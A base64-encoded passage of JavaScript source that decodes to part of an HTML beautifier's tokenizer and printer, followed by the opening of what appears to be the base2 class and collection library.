wpOyAvL2NhbGwgdGhlIEpTIEJlYXV0aWZpZXINCnJldHVybiBbdG9rZW4sICdUS19DT05URU5UJ107DQp9DQppZiAodGhpcy5jdXJyZW50X21vZGUgPT09ICdydW5ib3gnKSB7DQp0b2tlbiA9IHRoaXMuZ2V0X2NvbnRlbnQoKTsNCmlmICh0eXBlb2YgdG9rZW4gIT09ICdzdHJpbmcnKSB7DQpyZXR1cm4gdG9rZW47DQp9DQplbHNlIHsNCnJldHVybiBbdG9rZW4sICdUS19DT05URU5UJ107DQp9DQp9DQoNCmlmKHRoaXMuY3VycmVudF9tb2RlID09PSAnVEFHJykgew0KdG9rZW4gPSB0aGlzLmdldF90YWcoKTsNCmlmICh0eXBlb2YgdG9rZW4gIT09ICdzdHJpbmcnKSB7DQpyZXR1cm4gdG9rZW47DQp9DQplbHNlIHsNCnZhciB0YWdfbmFtZV90eXBlID0gJ1RLX1RBR18nICsgdGhpcy50YWdfdHlwZTsNCnJldHVybiBbdG9rZW4sIHRhZ19uYW1lX3R5cGVdOw0KfQ0KfQ0KfQ0KDQp0aGlzLnByaW50ZXIgPSBmdW5jdGlvbiAoanNfc291cmNlLCBpbmRlbnRfY2hhcmFjdGVyLCBpbmRlbnRfc2l6ZSwgbWF4X2NoYXIpIHsgLy9oYW5kbGVzIGlucHV0L291dHB1dCBhbmQgc29tZSBvdGhlciBwcmludGluZyBmdW5jdGlvbnMNCg0KdGhpcy5pbnB1dCA9IGpzX3NvdXJjZSB8fCAnJzsgLy9nZXRzIHRoZSBpbnB1dCBmb3IgdGhlIFBhcnNlcg0KdGhpcy5vdXRwdXQgPSBbXTsNCnRoaXMuaW5kZW50X2NoYXJhY3RlciA9IGluZGVudF9jaGFyYWN0ZXIgfHwgJyAnOw0KdGhpcy5pbmRlbnRfc3RyaW5nID0gJyc7DQp0aGlzLmluZGVudF9zaXplID0gaW5kZW50X3NpemUgfHwgMjsNCnRoaXMuaW5kZW50X2xldmVsID0gMDsNCnRoaXMubWF4X2NoYXIgPSBtYXhfY2hhciB8fCA3MDsgLy9tYXhpbXVtIGFtb3VudCBvZiBjaGFyYWN0ZXJzIHBlciBsaW5lDQp0aGlzLmxpbmVfY2hhcl9jb3VudCA9IDA7IC8vY291bnQgdG8gc2VlIGlmIG1heF9jaGFyIHdhcyBleGNlZWRlZA0KDQpmb3IgKHZhciBpPTA7IGk8dGhpcy5pbmRlbnRfc2l6ZTsgaSsrKSB7DQp0aGlzLmluZGVudF9zdHJpbmcgKz0gdGhpcy5pbmRlbnRfY2hhcmFjdGVyOw0KfQ0KDQp0aGlzLnByaW50X25ld2xpbmUgPSBmdW5jdGlvbiAoaWdub3JlLCBhcnIpIHsNCnRoaXMubGluZV9jaGFyX2NvdW50ID0gMDsNCmlmICghYXJyIHx8ICFhcnIubGVuZ3RoKSB7DQpyZXR1cm47DQp9DQppZiAoIWlnbm9yZSkgeyAvL3dlIG1pZ2h0IHdhbnQgdGhlIGV4dHJhIGxpbmUNCndoaWxlICh0aGlzLlV0aWxzLmluX2FycmF5KGFyclthcnIubGVuZ3RoLTFdLCB0aGlzLlV0aWxzLndoaXRlc3BhY2UpKSB7DQphcnIucG9wKCk7DQp9DQp9DQphcnIucHVzaCgnXG4nKTsNCmZvciAodmFyIGk9MDsgaTx0aGlzLmluZGVudF9sZXZlbDsgaSsrKSB7DQphcnIucHVzaCh0aGlzLmluZGVudF9zdHJpbmcpOw0KfQ0KfQ0KDQoNCnRoaXMucHJpbnRfdG9rZW4gPSBmdW5jdGlvbiAodGV4dCkgew0KdGhpcy5vdXRwdXQucHVzaCh0ZXh0KTsNCn0NCg0KdGhpcy5pbmRlbnQgPSBmdW5jdGlvbiAoKSB7DQp0aGlzLmluZGVudF9sZXZlbCsrOw0KfQ0KDQp0aGlzLnVuaW5kZW50ID0gZnVuY3Rpb24gKCkgew0KaWYgKHRoaXMuaW5kZW50X2xldmVsID4gMCkgew0KdGhpcy5pbmRlbnRfbGV2ZWwtLTsNCn0NCn0NCn0NCnJldHVybiB0aGlzOw0KfQ0KDQovKl9fX19fX19fX19fX19fX19fX19fXy0tLS0tLS0tLS0tLS0tLS0tLS0tX19fX19fX19fX19fX19fX19fX19fKi8NCg0KDQoNCm11bHRpX3BhcnNlciA9IG5ldyBQYXJzZXIoKTsgLy93cmFwcGluZyBmdW5jdGlvbnMgUGFyc2VyDQptdWx0aV9wYXJzZXIucHJpbnRlcihodG1sX3NvdXJjZSwgaW5kZW50X2NoYXJhY3RlciwgaW5kZW50X3NpemUpOyAvL2luaXRpYWxpemUgc3RhcnRpbmcgdmFsdWVzDQoNCg0KDQp3aGlsZSAodHJ1ZSkgew0KdmFyIHQgPSBtdWx0aV9wYXJzZXIuZ2V0X3Rva2VuKCk7DQptdWx0aV9wYXJzZXIudG9rZW5fdGV4dCA9IHRbMF07DQptdWx0aV9wYXJzZXIudG9rZW5fdHlwZSA9IHRbMV07DQoNCmlmIChtdWx0aV9wYXJzZXIudG9rZW5fdHlwZSA9PT0gJ1RLX0VPRicpIHsNCmJyZWFrOw0KfQ0KDQoNCnN3aXRjaCAobXVsdGlfcGFyc2VyLnRva2VuX3R5cGUpIHsNCmNhc2UgJ1RLX1RBR19TVEFSVCc6IGNhc2UgJ1RLX1RBR19TQ1JJUFQnOiBjYXNlICdUS19UQUdfU1RZTEUnOg0KbXVsdGlfcGFyc2VyLnByaW50X25ld2xpbmUoZmFsc2UsIG11bHRpX3BhcnNlci5vdXRwdXQpOw0KbXVsdGlfcGFyc2VyLnByaW50X3Rva2VuKG11bHRpX3BhcnNlci50b2tlbl90ZXh0KTsNCm11bHRpX3BhcnNlci5pbmRlbnQoKTsNCm11bHRpX3BhcnNlci5jdXJyZW50X21vZGUgPSAncnVuYm94JzsNCmJyZWFrOw0KY2FzZSAnVEtfVEFHX0VORCc6DQptdWx0aV9wYXJzZXIucHJpbnRfbmV3bGluZSh0cnVlLCBtdWx0aV9wYXJzZXIub3V0cHV0KTsNCm11bHRpX3BhcnNlci5wcmludF90b2tlbihtdWx0aV9wYXJzZXIudG9rZW5fdGV4dCk7DQptdWx0aV9wYXJzZXIuY3VycmVudF9tb2RlID0gJ3J1bmJveCc7DQpicmVhazsNCmNhc2UgJ1RLX1RBR19TSU5HTEUnOg0KbXVsdGlfcGFyc2VyLnByaW50X25ld2xpbmUoZmFsc2UsIG11bHRpX3BhcnNlci5vdXRwdXQpOw0KbXVsdGlfcGFyc2VyLnByaW50X3Rva2VuKG11bHRpX3BhcnNlci50b2tlbl90ZXh0KTsNCm11bHRpX3BhcnNlci5jdXJyZW50X21vZGUgPSAncnVuYm94JzsNCmJyZWFrOw0KY2FzZSAnVEtfQ09OVEVOVCc6DQppZiAobXVsdGlfcGFyc2VyLnRva2VuX3RleHQgIT09ICcnKSB7DQptdWx0aV9wYXJzZXIucHJpbnRfbmV3bGluZShmYWxzZSwgbXVsdGlfcGFyc2VyLm91dHB1dCk7DQptdWx0aV9wYXJzZXIucHJpbnRfdG9rZW4obXVsdGlfcGFyc2VyLnRva2VuX3RleHQpOw0KfQ0KbXVsdGlfcGFyc2VyLmN1cnJlbnRfbW9kZSA9ICdUQUcnOw0KYnJlYWs7DQp9DQptdWx0aV9wYXJzZXIubGFzdF90b2tlbiA9IG11bHRpX3BhcnNlci50b2tlbl90eXBlOw0KbXVsdGlfcGFyc2VyLmxhc3RfdGV4dCA9IG11bHRpX3BhcnNlci50b2tlbl90ZXh0Ow0KfQ0KcmV0dXJuIG11bHRpX3BhcnNlci5vdXRwdXQuam9pbignJyk7DQp9DQoNCnZhciBiYXNlMiA9IHsNCm5hbWU6ICJiYXNlMiIsDQp2ZXJzaW9uOiAiMS4wIiwNCmV4cG9ydHM6ICJCYXNlLFBhY2thZ2UsQWJzdHJhY3QsTW9kdWxlLEVudW1lcmFibGUsTWFwLENvbGxlY3Rpb24sUmVnR3JwLFVuZGVmaW5lZCxOdWxsLFRoaXMsVHJ1ZSxGYWxzZSxhc3NpZ25JRCxkZXRlY3QsZ2xvYmFsIiwNCm5hbWVzcGFjZTogIiINCn07DQpuZXcNCmZ1bmN0aW9uKF95KSB7DQp2YXIgVW5kZWZpbmVkID0gSygpLA0KTnVsbCA9IEsobnVsbCksDQpUcnVlID0gSyh0cnVlKSwNCkZhbHNlID0gSyhmYWxzZSksDQpUaGlzID0gZnVuY3Rpb24oKSB7DQpyZXR1cm4gdGhpcw0KfTsNCnZhciBnbG9iYWwgPSBUaGlzKCk7DQp2YXIgYmFzZTIgPSBnbG9iYWwuYmFzZTI7DQp2YXIgX3ogPSAvJShbMS05XSkvZzsNCnZhciBfZyA9IC9eXHNccyovOw0KdmFyIF9oID0gL1xzXHMqJC87DQp2YXIgX2kgPSAvKFtcLygpW1xde318KistLixeJD9cXF0pL2c7DQp2YXIgXzkgPSAvdHJ5Ly50ZXN0KGRldGVjdCkgPyAvXGJiYXNlXGIvOiAvLiovOw0KdmFyIF9hID0gWyJjb25zdHJ1Y3RvciIsICJ0b1N0cmluZyIsICJ2YWx1ZU9mIl07DQp2YXIgX2ogPSBkZXRlY3QoIihqc2NyaXB0KSIpID8gbmV3IFJlZ0V4cCgiXiIgKyByZXNjYXBlKGlzTmFOKS5yZXBsYWNlKC9pc05hTi8sICJcXHcrIikgKyAiJCIpIDogew0KdGVzdDogRmFsc2UNCn07DQp2YXIgX2sgPSAxOw0KdmFyIF8yID0gQXJyYXkucHJvdG90eXBlLnNsaWNlOw0KXzUoKTsNCmZ1bmN0aW9uIGFzc2lnbklEKGEpIHsNCmlmICghYS5iYXNlMklEKSBhLmJhc2UySUQgPSAiYjJfIiArIF9rKys7DQpyZXR1cm4gYS5iYXNlMklEDQp9Ow0KdmFyIF9iID0gZnVuY3Rpb24oYSwgYikgew0KYmFzZTIuX19wcm90b3R5cGluZyA9IHRoaXMucHJvdG90eXBlOw0KdmFyIGMgPSBuZXcgdGhpczsNCmlmIChhKSBleHRlbmQoYywgYSk7DQpkZWxldGUgYmFzZTIuX19wcm90b3R5cGluZzsNCnZhciBlID0gYy5jb25zdHJ1Y3RvcjsNCmZ1bmN0aW9uIGQoKSB7DQppZiAoIWJhc2UyLl9fcHJvdG90eXBpbmcpIHsNCmlmICh0aGlzLmNvbnN0cnVjdG9yID09IGFyZ3VtZW50cy5jYWxsZWUgfHwgdGhpcy5fX2NvbnN0cnVjdGluZykgew0KdGhpcy5fX2NvbnN0cnVjdGluZyA9IHRydWU7DQplLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQpkZWxldGUgdGhpcy5fX2NvbnN0cnVjdGluZw0KfSBlbHNlIHsNCnJldHVybiBleHRlbmQoYXJndW1lbnRzWzBdLCBjKQ0KfQ0KfQ0KcmV0dXJuIHRoaXMNCn07DQpjLmNvbnN0cnVjdG9yID0gZDsNCmZvciAodmFyIGYgaW4gQmFzZSkgZFtmXSA9IHRoaXNbZl07DQpkLmFuY2VzdG9yID0gdGhpczsNCmQuYmFzZSA9IFVuZGVmaW5lZDsNCmlmIChiKSBleHRlbmQoZCwgYik7DQpkLnByb3RvdHlwZSA9IGM7DQppZiAoZC5pbml0KSBkLmluaXQoKTsNCnJldHVybiBkDQp9Ow0KdmFyIEJhc2UgPSBfYi5jYWxsKE9iamVjdCwgew0KY29uc3RydWN0b3I6IGZ1bmN0aW9uKCkgew0KaWYgKGFyZ3VtZW50cy5sZW5ndGggPiAwKSB7DQp0aGlzLmV4dGVuZChhcmd1bWVudHNbMF0pDQp9DQp9LA0KYmFzZTogZnVuY3Rpb24oKSB7fSwNCmV4dGVuZDogZGVsZWdhdGUoZXh0ZW5kKQ0KfSwNCkJhc2UgPSB7DQphbmNlc3Rvck9mOiBmdW5jdGlvbihhKSB7DQpyZXR1cm4gXzcodGhpcywgYSkNCn0sDQpleHRlbmQ6IF9iLA0KZm9yRWFjaDogZnVuY3Rpb24oYSwgYiwgYykgew0KXzUodGhpcywgYSwgYiwgYykNCn0sDQppbXBsZW1lbnQ6IGZ1bmN0aW9uKGEpIHsNCmlmICh0eXBlb2YgYSA9PSAiZnVuY3Rpb24iKSB7DQphID0gYS5wcm90b3R5cGUNCn0NCmV4dGVuZCh0aGlzLnByb3RvdHlwZSwgYSk7DQpyZXR1cm4gdGhpcw0KfQ0KfSk7DQp2YXIgUGFja2FnZSA9IEJhc2UuZXh0ZW5kKHsNCmNvbnN0cnVjdG9yOiBmdW5jdGlvbihlLCBkKSB7DQp0aGlzLmV4dGVuZChkKTsNCmlmICh0aGlzLmluaXQpIHRoaXMuaW5pdCgpOw0KaWYgKHRoaXMubmFtZSAmJiB0aGlzLm5hbWUgIT0gImJhc2UyIikgew0KaWYgKCF0aGlzLnBhcmVudCkgdGhpcy5wYXJlbnQgPSBiYXNlMjsNCnRoaXMucGFyZW50LmFkZE5hbWUodGhpcy5uYW1lLCB0aGlzKTsNCnRoaXMubmFtZXNwYWNlID0gZm9ybWF0KCJ2YXIgJTE9JTI7IiwgdGhpcy5uYW1lLCBTdHJpbmcyLnNsaWNlKHRoaXMsIDEsIC0xKSkNCn0NCmlmIChlKSB7DQp2YXIgZiA9IGJhc2UyLkphdmFTY3JpcHQgPyBiYXNlMi5KYXZhU2NyaXB0Lm5hbWVzcGFjZTogIiI7DQplLmltcG9ydHMgPSBBcnJheTIucmVkdWNlKGNzdih0aGlzLmltcG9ydHMpLA0KZnVuY3Rpb24oYSwgYikgew0KdmFyIGMgPSBoKGIpIHx8IGgoIkphdmFTY3JpcHQuIiArIGIpOw0KcmV0dXJuIGEgKz0gYy5uYW1lc3BhY2UNCn0sDQoidmFyIGJhc2UyPShmdW5jdGlvbigpe3JldHVybiB0aGlzLmJhc2UyfSkoKTsiICsgYmFzZTIubmFtZXNwYWNlICsgZikgKyBsYW5nLm5hbWVzcGFjZTsNCmUuZXhwb3J0cyA9IEFycmF5Mi5yZWR1Y2UoY3N2KHRoaXMuZXhwb3J0cyksDQpmdW5jdGlvbihhLCBiKSB7DQp2YXIgYyA9IHRoaXMubmFtZSArICIuIiArIGI7DQp0aGlzLm5hbWVzcGFjZSArPSAidmFyICIgKyBiICsgIj0iICsgYyArICI7IjsNCnJldHVybiBhICs9ICJpZighIiArIGMgKyAiKSIgKyBjICsgIj0iICsgYiArICI7Ig0KfSwNCiIiLCB0aGlzKSArICJ0aGlzLl9sIiArIHRoaXMubmFtZSArICIoKTsiOw0KdmFyIGcgPSB0aGlzOw0KdmFyIGkgPSBTdHJpbmcyLnNsaWNlKHRoaXMsIDEsIC0xKTsNCmVbIl9sIiArIHRoaXMubmFtZV0gPSBmdW5jdGlvbigpIHsNClBhY2thZ2UuZm9yRWFjaChnLA0KZnVuY3Rpb24oYSwgYikgew0KaWYgKGEgJiYgYS5hbmNlc3Rvck9mID09IEJhc2UuYW5jZXN0b3JPZikgew0KYS50b1N0cmluZyA9IEsoZm9ybWF0KCJbJTEuJTJdIiwgaSwgYikpOw0KaWYgKGEucHJvdG90eXBlLnRvU3RyaW5nID09IEJhc2UucHJvdG90eXBlLnRvU3RyaW5nKSB7DQphLnByb3RvdHlwZS50b1N0cmluZyA9IEsoZm9ybWF0KCJbb2JqZWN0ICUxLiUyXSIsIGksIGIpKQ0KfQ0KfQ0KfSkNCn0NCn0NCmZ1bmN0aW9uIGgoYSkgew0KYSA9IGEuc3BsaXQoIi4iKTsNCnZhciBiID0gYmFzZTIsDQpjID0gMDsNCndoaWxlIChiICYmIGFbY10gIT0gbnVsbCkgew0KYiA9IGJbYVtjKytdXQ0KfQ0KcmV0dXJuIGINCn0NCn0sDQpleHBvcnRzOiAiIiwNCmltcG9ydHM6ICIiLA0KbmFtZTogIiIsDQpuYW1lc3BhY2U6ICIiLA0KcGFyZW50OiBudWxsLA0KYWRkTmFtZTogZnVuY3Rpb24oYSwgYikgew0KaWYgKCF0aGlzW2FdKSB7DQp0aGlzW2FdID0gYjsNCnRoaXMuZXhwb3J0cyArPSAiLCIgKyBhOw0KdGhpcy5uYW1lc3BhY2UgKz0gZm9ybWF0KCJ2YXIgJTE9JTIuJTE7IiwgYSwgdGhpcy5uYW1lKQ0KfQ0KfSwNCmFkZFBhY2thZ2U6IGZ1bmN0aW9uKGEpIHsNCnRoaXMuYWRkTmFtZShhLCBuZXcgUGFja2FnZShudWxsLCB7DQpuYW1lOiBhLA0KcGFyZW50OiB0aGlzDQp9KSkNCn0sDQp0b1N0cmluZzogZnVuY3Rpb24oKSB7DQpyZXR1cm4gZm9ybWF0KCJbJTFdIiwgdGhpcy5wYXJlbnQgPyBTdHJpbmcyLnNsaWNlKHRoaXMucGFyZW50LCAxLCAtMSkgKyAiLiIgKyB0aGlzLm5hbWU6IHRoaXMubmFtZSkNCn0NCn0pOw0KdmFyIEFic3RyYWN0ID0gQmFzZS5leHRlbmQoew0KY29uc3RydWN0b3I6IGZ1bmN0aW9uKCkgew0KdGhyb3cgbmV3IFR5cGVFcnJvcigiQWJzdHJhY3QgY2xhc3MgY2Fubm90IGJlIGluc3RhbnRpYXRlZC4iKTsNCn0NCn0pOw0KdmFyIF9tID0gMDsNCnZhciBNb2R1bGUgPSBBYnN0cmFjdC5leHRlbmQobnVsbCwgew0KbmFtZXNwYWNlOiAiIiwNCmV4dGVuZDogZnVuY3Rpb24oYSwgYikgew0KdmFyIGMgPSB0aGlzLmJhc2UoKTsNCnZhciBlID0gX20rKzsNCmMubmFtZXNwYWNlID0gIiI7DQpjLnBhcnRpYWwgPSB0aGlzLnBhcnRpYWw7DQpjLnRvU3RyaW5nID0gSygiW2Jhc2UyLk1vZHVsZVsiICsgZSArICJdXSIpOw0KTW9kdWxlW2VdID0gYzsNCmMuaW1wbGVtZW50KHRoaXMpOw0KaWYgKGEpIGMuaW1wbGVtZW50KGEpOw0KaWYgKGIpIHsNCmV4dGVuZChjLCBiKTsNCmlmIChjLmluaXQpIGMuaW5pdCgpDQp9DQpyZXR1cm4gYw0KfSwNCmZvckVhY2g6IGZ1bmN0aW9uKGMsIGUpIHsNCl81KE1vZHVsZSwgdGhpcy5wcm90b3R5cGUsDQpmdW5jdGlvbihhLCBiKSB7DQppZiAodHlwZU9mKGEpID09ICJmdW5jdGlvbiIpIHsNCmMuY2FsbChlLCB0aGlzW2JdLCBiLCB0aGlzKQ0KfQ0KfSwNCnRoaXMpDQp9LA0KaW1wbGVtZW50OiBmdW5jdGlvbihhKSB7DQp2YXIgYiA9IHRoaXM7DQp2YXIgYyA9IGIudG9TdHJpbmcoKS5zbGljZSgxLCAtMSk7DQppZiAodHlwZW9mIGEgPT0gImZ1bmN0aW9uIikgew0KaWYgKCFfNyhhLCBiKSkgew0KdGhpcy5iYXNlKGEpDQp9DQppZiAoXzcoTW9kdWxlLCBhKSkgew0KZm9yICh2YXIgZSBpbiBhKSB7DQppZiAoYltlXSA9PT0gdW5kZWZpbmVkKSB7DQp2YXIgZCA9IGFbZV07DQppZiAodHlwZW9mIGQgPT0gImZ1bmN0aW9uIiAmJiBkLmNhbGwgJiYgYS5wcm90b3R5cGVbZV0pIHsNCmQgPSBfbihhLCBlKQ0KfQ0KYltlXSA9IGQNCn0NCn0NCmIubmFtZXNwYWNlICs9IGEubmFtZXNwYWNlLnJlcGxhY2UoL2Jhc2UyXC5Nb2R1bGVcW1xkK1xdL2csIGMpDQp9DQp9IGVsc2Ugew0KZXh0ZW5kKGIsIGEpOw0KX2MoYiwgYSkNCn0NCnJldHVybiBiDQp9LA0KcGFydGlhbDogZnVuY3Rpb24oKSB7DQp2YXIgYyA9IE1vZHVsZS5leHRlbmQoKTsNCnZhciBlID0gYy50b1N0cmluZygpLnNsaWNlKDEsIC0xKTsNCmMubmFtZXNwYWNlID0gdGhpcy5uYW1lc3BhY2UucmVwbGFjZSgvKFx3Kyk9YlteXCldK1wpL2csICIkMT0iICsgZSArICIuJDEiKTsNCnRoaXMuZm9yRWFjaChmdW5jdGlvbihhLCBiKSB7DQpjW2JdID0gcGFydGlhbChiaW5kKGEsIGMpKQ0KfSk7DQpyZXR1cm4gYw0KfQ0KfSk7DQpmdW5jdGlvbiBfYyhhLCBiKSB7DQp2YXIgYyA9IGEucHJvdG90eXBlOw0KdmFyIGUgPSBhLnRvU3RyaW5nKCkuc2xpY2UoMSwgLTEpOw0KZm9yICh2YXIgZCBpbiBiKSB7DQp2YXIgZiA9IGJbZF0sDQpnID0gIiI7DQppZiAoZC5jaGFyQXQoMCkgPT0gIkAiKSB7DQppZiAoZGV0ZWN0KGQuc2xpY2UoMSkpKSBfYyhhLCBmKQ0KfSBlbHNlIGlmICghY1tkXSkgew0KaWYgKGQgPT0gZC50b1VwcGVyQ2FzZSgpKSB7DQpnID0gInZhciAiICsgZCArICI9IiArIGUgKyAiLiIgKyBkICsgIjsiDQp9IGVsc2UgaWYgKHR5cGVvZiBmID09ICJmdW5jdGlvbiIgJiYgZi5jYWxsKSB7DQpnID0gInZhciAiICsgZCArICI9YmFzZTIubGFuZy5iaW5kKCciICsgZCArICInLCIgKyBlICsgIik7IjsNCmNbZF0gPSBfbyhhLCBkKQ0KfQ0KaWYgKGEubmFtZXNwYWNlLmluZGV4T2YoZykgPT0gLTEpIHsNCmEubmFtZXNwYWNlICs9IGcNCn0NCn0NCn0NCn07DQpmdW5jdGlvbiBfbihhLCBiKSB7DQpyZXR1cm4gZnVuY3Rpb24oKSB7DQpyZXR1cm4gYVtiXS5hcHBseShhLCBhcmd1bWVudHMpDQp9DQp9Ow0KZnVuY3Rpb24gX28oYiwgYykgew0KcmV0dXJuIGZ1bmN0aW9uKCkgew0KdmFyIGEgPSBfMi5jYWxsKGFyZ3VtZW50cyk7DQphLnVuc2hpZnQodGhpcyk7DQpyZXR1cm4gYltjXS5hcHBseShiLCBhKQ0KfQ0KfTsNCnZhciBFbnVtZXJhYmxlID0gTW9kdWxlLmV4dGVuZCh7DQpldmVyeTogZnVuY3Rpb24oYywgZSwgZCkgew0KdmFyIGYgPSB0cnVlOw0KdHJ5IHsNCmZvckVhY2goYywNCmZ1bmN0aW9uKGEsIGIpIHsNCmYgPSBlLmNhbGwoZCwgYSwgYiwgYyk7DQppZiAoIWYpIHRocm93IFN0b3BJdGVyYXRpb247DQp9KQ0KfSBjYXRjaChlcnJvcikgew0KaWYgKGVycm9yICE9IFN0b3BJdGVyYXRpb24pIHRocm93IGVycm9yOw0KfQ0KcmV0dXJuICEhIGYNCn0sDQpmaWx0ZXI6IGZ1bmN0aW9uKGUsIGQsIGYpIHsNCnZhciBnID0gMDsNCnJldHVybiB0aGlzLnJlZHVjZShlLA0KZnVuY3Rpb24oYSwgYiwgYykgew0KaWYgKGQuY2FsbChmLCBiLCBjLCBlKSkgew0KYVtnKytdID0gYg0KfQ0KcmV0dXJuIGENCn0sDQpbXSkNCn0sDQppbnZva2U6IGZ1bmN0aW9uKGIsIGMpIHsNCnZhciBlID0gXzIuY2FsbChhcmd1bWVudHMsIDIpOw0KcmV0dXJuIHRoaXMubWFwKGIsICh0eXBlb2YgYyA9PSAiZnVuY3Rpb24iKSA/DQpmdW5jdGlvbihhKSB7DQpyZXR1cm4gYSA9PSBudWxsID8gdW5kZWZpbmVkOiBjLmFwcGx5KGEsIGUpDQp9OiBmdW5jdGlvbihhKSB7DQpyZXR1cm4gYSA9PSBudWxsID8gdW5kZWZpbmVkOiBhW2NdLmFwcGx5KGEsIGUpDQp9KQ0KfSwNCm1hcDogZnVuY3Rpb24oYywgZSwgZCkgew0KdmFyIGYgPSBbXSwNCmcgPSAwOw0KZm9yRWFjaChjLA0KZnVuY3Rpb24oYSwgYikgew0KZltnKytdID0gZS5jYWxsKGQsIGEsIGIsIGMpDQp9KTsNCnJldHVybiBmDQp9LA0KcGx1Y2s6IGZ1bmN0aW9uKGIsIGMpIHsNCnJldHVybiB0aGlzLm1hcChiLA0KZnVuY3Rpb24oYSkgew0KcmV0dXJuIGEgPT0gbnVsbCA/IHVuZGVmaW5lZDogYVtjXQ0KfSkNCn0sDQpyZWR1Y2U6IGZ1bmN0aW9uKGMsIGUsIGQsIGYpIHsNCnZhciBnID0gYXJndW1lbnRzLmxlbmd0aCA+IDI7DQpmb3JFYWNoKGMsDQpmdW5jdGlvbihhLCBiKSB7DQppZiAoZykgew0KZCA9IGUuY2FsbChmLCBkLCBhLCBiLCBjKQ0KfSBlbHNlIHsNCmQgPSBhOw0KZyA9IHRydWUNCn0NCn0pOw0KcmV0dXJuIGQNCn0sDQpzb21lOiBmdW5jdGlvbihhLCBiLCBjKSB7DQpyZXR1cm4gISB0aGlzLmV2ZXJ5KGEsIG5vdChiKSwgYykNCn0NCn0pOw0KdmFyIF8xID0gIiMiOw0KdmFyIE1hcCA9IEJhc2UuZXh0ZW5kKHsNCmNvbnN0cnVjdG9yOiBmdW5jdGlvbihhKSB7DQppZiAoYSkgdGhpcy5tZXJnZShhKQ0KfSwNCmNsZWFyOiBmdW5jdGlvbigpIHsNCmZvciAodmFyIGEgaW4gdGhpcykgaWYgKGEuaW5kZXhPZihfMSkgPT0gMCkgew0KZGVsZXRlIHRoaXNbYV0NCn0NCn0sDQpjb3B5OiBmdW5jdGlvbigpIHsNCmJhc2UyLl9fcHJvdG90eXBpbmcgPSB0cnVlOw0KdmFyIGEgPSBuZXcgdGhpcy5jb25zdHJ1Y3RvcjsNCmRlbGV0ZSBiYXNlMi5fX3Byb3RvdHlwaW5nOw0KZm9yICh2YXIgYiBpbiB0aGlzKSBpZiAodGhpc1tiXSAhPT0gYVtiXSkgew0KYVtiXSA9IHRoaXNbYl0NCn0NCnJldHVybiBhDQp9LA0KZm9yRWFjaDogZnVuY3Rpb24oYSwgYikgew0KZm9yICh2YXIgYyBpbiB0aGlzKSBpZiAoYy5pbmRleE9mKF8xKSA9PSAwKSB7DQphLmNhbGwoYiwgdGhpc1tjXSwgYy5zbGljZSgxKSwgdGhpcykNCn0NCn0sDQpnZXQ6IGZ1bmN0aW9uKGEpIHsNCnJldHVybiB0aGlzW18xICsgYV0NCn0sDQpnZXRLZXlzOiBmdW5jdGlvbigpIHsNCnJldHVybiB0aGlzLm1hcChJSSkNCn0sDQpnZXRWYWx1ZXM6IGZ1bmN0aW9uKCkgew0KcmV0dXJuIHRoaXMubWFwKEkpDQp9LA0KaGFzOiBmdW5jdGlvbihhKSB7DQovKkBjY19vbiBAKi8NCi8qQGlmKEBfanNjcmlwdF92ZXJzaW9uPDUuNSlyZXR1cm4gJExlZ2FjeS5oYXModGhpcyxfMSthKTtAZWxzZSBAKi8NCnJldHVybiBfMSArIGEgaW4gdGhpczsNCi8qQGVuZCBAKi8NCn0sDQptZXJnZTogZnVuY3Rpb24oYikgew0KdmFyIGMgPSBmbGlwKHRoaXMucHV0KTsNCmZvckVhY2goYXJndW1lbnRzLA0KZnVuY3Rpb24oYSkgew0KZm9yRWFjaChhLCBjLCB0aGlzKQ0KfSwNCnRoaXMpOw0KcmV0dXJuIHRoaXMNCn0sDQpwdXQ6IGZ1bmN0aW9uKGEsIGIpIHsNCnRoaXNbXzEgKyBhXSA9IGINCn0sDQpyZW1vdmU6IGZ1bmN0aW9uKGEpIHsNCmRlbGV0ZSB0aGlzW18xICsgYV0NCn0sDQpzaXplOiBmdW5jdGlvbigpIHsNCnZhciBhID0gMDsNCmZvciAodmFyIGIgaW4gdGhpcykgaWYgKGIuaW5kZXhPZihfMSkgPT0gMCkgYSsrOw0KcmV0dXJuIGENCn0sDQp1bmlvbjogZnVuY3Rpb24oYSkgew0KcmV0dXJuIHRoaXMubWVyZ2UuYXBwbHkodGhpcy5jb3B5KCksIGFyZ3VtZW50cykNCn0NCn0pOw0KTWFwLmltcGxlbWVudChFbnVtZXJhYmxlKTsNCk1hcC5wcm90b3R5cGUuZmlsdGVyID0gZnVuY3Rpb24oZSwgZCkgew0KcmV0dXJuIHRoaXMucmVkdWNlKGZ1bmN0aW9uKGEsIGIsIGMpIHsNCmlmICghZS5jYWxsKGQsIGIsIGMsIHRoaXMpKSB7DQphLnJlbW92ZShjKQ0KfQ0KcmV0dXJuIGENCn0sDQp0aGlzLmNvcHkoKSwgdGhpcykNCn07DQp2YXIgXzAgPSAifiI7DQp2YXIgQ29sbGVjdGlvbiA9IE1hcC5leHRlbmQoew0KY29uc3RydWN0b3I6IGZ1bmN0aW9uKGEpIHsNCnRoaXNbXzBdID0gbmV3IEFycmF5MjsNCnRoaXMuYmFzZShhKQ0KfSwNCmFkZDogZnVuY3Rpb24oYSwgYikgew0KYXNzZXJ0KCF0aGlzLmhhcyhhKSwgIkR1cGxpY2F0ZSBrZXkgJyIgKyBhICsgIicuIik7DQp0aGlzLnB1dC5hcHBseSh0aGlzLCBhcmd1bWVudHMpDQp9LA0KY2xlYXI6IGZ1bmN0aW9uKCkgew0KdGhpcy5iYXNlKCk7DQp0aGlzW18wXS5sZW5ndGggPSAwDQp9LA0KY29weTogZnVuY3Rpb24oKSB7DQp2YXIgYSA9IHRoaXMuYmFzZSgpOw0KYVtfMF0gPSB0aGlzW18wXS5jb3B5KCk7DQpyZXR1cm4gYQ0KfSwNCmZvckVhY2g6IGZ1bmN0aW9uKGEsIGIpIHsNCnZhciBjID0gdGhpc1tfMF07DQp2YXIgZSA9IGMubGVuZ3RoOw0KZm9yICh2YXIgZCA9IDA7IGQgPCBlOyBkKyspIHsNCmEuY2FsbChiLCB0aGlzW18xICsgY1tkXV0sIGNbZF0sIHRoaXMpDQp9DQp9LA0KZ2V0QXQ6IGZ1bmN0aW9uKGEpIHsNCnZhciBiID0gdGhpc1tfMF0uaXRlbShhKTsNCnJldHVybiAoYiA9PT0gdW5kZWZpbmVkKSA/IHVuZGVmaW5lZDogdGhpc1tfMSArIGJdDQp9LA0KZ2V0S2V5czogZnVuY3Rpb24oKSB7DQpyZXR1cm4gdGhpc1tfMF0uY29weSgpDQp9L